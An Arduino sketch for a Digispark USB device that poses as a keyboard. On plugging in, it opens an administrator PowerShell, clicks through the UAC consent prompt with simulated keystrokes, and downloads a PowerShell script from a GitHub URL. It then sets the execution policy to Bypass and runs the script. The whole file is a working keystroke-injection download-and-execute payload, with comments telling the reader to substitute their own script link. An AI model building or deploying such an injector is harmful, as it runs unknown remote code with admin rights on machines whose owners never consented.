#include "DigiKeyboard.h"

void setup() {


  //This chunk is for Opening powershell as administrator (Default C:\Windows\system32 directory)
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);  // press the windows key
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(2000);//Give the bloatware in the start menu some time to load.
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);// CTRL+SHIFT+ENTER
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);



  DigiKeyboard.delay(500);                   //Replace link with your RAW github powershell file. If you link the regular repository, it will download HTML data.
  DigiKeyboard.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CGMW293/DigisparkScripts/main/Auto-script%20setup/First.ps1' -OutFile './ski.ps1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);//may need to change value, depending on bandwidth and size of the file.
  DigiKeyboard.print("Set-ExecutionPolicy Bypass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("./ski.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {

}